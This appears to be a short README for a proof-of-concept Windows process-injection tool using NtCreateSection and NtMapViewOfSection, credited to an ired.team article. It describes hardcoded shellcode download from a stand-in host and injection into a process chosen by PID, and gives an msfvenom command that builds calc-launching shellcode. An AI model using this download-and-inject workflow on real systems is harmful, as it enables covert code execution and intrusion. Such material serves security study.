Got info from https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection

To run:
- commandline execution
- Must have a web server listening and hosting a shellcode
- Shellcode must be x64
- POC hardcoded to download http://mal_download.com/spawn_calc.x64.sc
- Created the Shellcode using metaspoits msfvenom `msfvenom -p windows/x64/exec CMD="c:\windows\system32\calc.exe -o spawn_calc.x64.sc`
- command line argument target is the process id(PID) of a currently runnint x64 bit process
- 


